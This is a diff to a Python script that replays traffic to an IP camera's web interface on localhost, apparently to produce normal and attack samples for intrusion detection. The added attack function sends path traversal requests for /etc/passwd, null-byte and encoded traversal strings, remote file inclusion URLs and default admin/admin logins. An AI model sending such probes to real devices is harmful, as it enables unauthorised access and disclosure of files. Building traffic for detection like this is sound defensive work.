@@ -264,7 +264,147 @@ def simulate_post():
     r = requests.post("http://localhost:80/post_test", data="test_data")
     print(r)
 
-#simulate_initial_connection()
-simulate_moving()
+def simulate_initial_connection_attack():
+    my_headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
+        "Accept-Encoding": "gzip, deflate",
+        "Connection": "keep-alive",
+        "Upgrade-Insecure-Requests": "1"
+    }
+    r = requests.get(url="http://localhost:80", auth=("admin", "admin"), headers=my_headers)
+    print(r)
+    r = requests.get(url="http://localhost:80/web/admin.html", auth=("admin", "admin"), headers=my_headers)
+    print(r)
+    my_headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
+        "Accept": "*/*",
+        "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
+        "Accept-Encoding": "gzip, deflate",
+        "Connection": "keep-alive",
+        "Referer": "http://146.136.47.202/web/admin.html"
+    }
+    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/param.cgi?cmd=getserverinfo", auth=("admin", "admin"),
+                     headers=my_headers)
+    print(r)
+    my_headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
+        "Accept-Encoding": "gzip, deflate",
+        "Connection": "keep-alive",
+        "Referer": "http://146.136.47.202/web/admin.html"
+    }
+
+    r = requests.get(url="http://localhost:80/web/mainpage.html", auth=("admin", "admin"), headers=my_headers)
+    print(r)
+    r = requests.get(url="http://localhost:80/web/blank.html", auth=("admin", "admin"), headers=my_headers)
+    print(r)
+    my_headers["Accept"] = "image/avif,image/webp,*/*"
+    r = requests.get(url="http://localhost:80/web/upcam-img/favicon.ico", auth=("admin", "admin"), headers=my_headers)
+    print(r)
+    my_headers["Accept"] = "*/*"
+    my_headers["Referer"] = "http://146.136.47.202/web/mainpage.html"
+    r = requests.get(url="http://localhost:80/web/js/language.js", auth=("admin", "admin"), headers=my_headers)
+    print(r)
+    r = requests.get(
+        url="http://localhost:80/web/cgi-bin/hi3510/param.cgi?cmd=getvencattr&cmd=getvencattr&cmd=getsetupflag&cmd=getaudioflag&cmd=getvideoattr&cmd=getimageattr&cmd=getinfrared&cmd=getserverinfo&cmd=getdevices&-chn=11&-chn=12",
+        auth=("admin", "admin"), headers=my_headers)
+    print(r)
+    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/param.cgi?cmd=gethttpport&cmd=getrtmpattr",
+                     auth=("admin", "admin"), headers=my_headers)
+    print(r)
+    my_headers["Accept"] = "text/css,*/*;q=0.1"
+    r = requests.get(url="http://localhost:80/web/ip3css/newIP3.css", auth=("admin", "admin"), headers=my_headers)
+    print(r)
+    r = requests.get(url="http://localhost:80/web/upcam-css/overrule.css", auth=("admin", "admin"), headers=my_headers)
+    print(r)
+
+def simulate_moving_attack():
+    my_headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
+        "Accept": "*/*",
+        "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
+        "Accept-Encoding": "gzip, deflate",
+        "Referer": "http://146.136.47.202/web/mainpage.html",
+        "X-Requested-With": "XMLHttpRequest",
+        "Connection": "keep-alive"
+    }
+    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?-step=infinity&-act=right&-speed=100", auth=("admin", "admin"), headers=my_headers)
+    print(r)
+    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?user=bob&authz_token=1234&expire=1500000000", auth=("admin", "admin"), headers=my_headers)
+    print(r)
+    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?-step=0&-act=stop&-speed=45", auth=("admin", "password"), headers=my_headers)
+    print(r)
+    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?file=report.pdf", auth=("admin", "password"), headers=my_headers)
+    print(r)
+    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?file=../../../../some dir/some file", auth=("admin", "password"), headers=my_headers)
+    print(r)
+    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?file=/etc/passwd", auth=("admin", "password"), headers=my_headers)
+    print(r)
+    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?page=http://other-site.com.br/other-page.htm/malicius-code.php", auth=("admin", "password"), headers=my_headers)
+    print(r)
+    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?page=http://google.com.br/index.htm/malicius-code.php", auth=("admin", "password"), headers=my_headers)
+    print(r)
+    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?page=http://other-site.com.br/other-page.htm/malicius-code.php", auth=("admin", "password"), headers=my_headers)
+    print(r)
+    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?page=http://google.com.br/index.htm/malicius-code.php", auth=("admin", "password"), headers=my_headers)
+    print(r)
+    sleep(1)
+    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?file=main.cgi", auth=("admin", "admin"), headers=my_headers)
+    print(r)
+    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?f=list", auth=("admin", "admin"), headers=my_headers)
+    print(r)
+    sleep(1)
+    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?f=2", auth=("admin", "admin"), headers=my_headers)
+    print(r)
+    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?f=test", auth=("admin", "admin"), headers=my_headers)
+    print(r)
+    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?f=/var/www/html/get.php", auth=("admin", "admin"), headers=my_headers)
+    print(r)
+    sleep(1)
+    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?f=/var/www/html/admin/get.inc", auth=("admin", "admin"), headers=my_headers)
+    print(r)
+    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?f=/etc/passwd", auth=("admin", "admin"), headers=my_headers)
+    print(r)
+    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?f=/var/www/html/get.php", auth=("admin", "admin"), headers=my_headers)
+    print(r)
+    sleep(1)
+    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?f=/../.../.../admin/etc.inc", auth=("admin", "admin"), headers=my_headers)
+    print(r)
+    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?f=/../passwd", auth=("admin", "admin"), headers=my_headers)
+    print(r)
+    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?home=ptzctrl.cgi", auth=("admin", "admin"), headers=my_headers)
+    print(r)
+    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?page=../scripts/foo.cgi%00txt", auth=("admin", "admin"), headers=my_headers)
+    print(r)
+    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?page=../scripts/ptzctrl.cgi%00txt", auth=("admin", "admin"), headers=my_headers)
+    print(r)
+    r = requests.get(url="http://localhost:80/web/cgi-bin/..%u2216..%u2216someother/ptzctrl.cgi?page=../scripts/ptzctrl.cgi%00txt", auth=("admin", "admin"), headers=my_headers)
+    print(r)
+    r = requests.get(url="http://localhost:80/web/cgi-bin/../../../../../etc/passwd", auth=("admin", "admin"), headers=my_headers)
+    print(r)
+
+def test():
+    my_headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
+        "Accept": "*/*",
+        "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
+        "Accept-Encoding": "gzip, deflate",
+        "Referer": "http://146.136.47.202/web/mainpage.html",
+        "X-Requested-With": "XMLHttpRequest",
+        "Connection": "keep-alive"
+    }
+    r = requests.get(url="http://localhost:80/web/cgi-bin/hi3510/ptzctrl.cgi?f=2", auth=("admin", "admin"), headers=my_headers)
+    print(r)
+
+TRAIN_NORMAL_TRAFFIC = False
+
+if TRAIN_NORMAL_TRAFFIC:
+    #simulate_initial_connection()
+    simulate_moving()
+else:
+    simulate_moving_attack()
 #simulate_snap()
 #simulate_post()
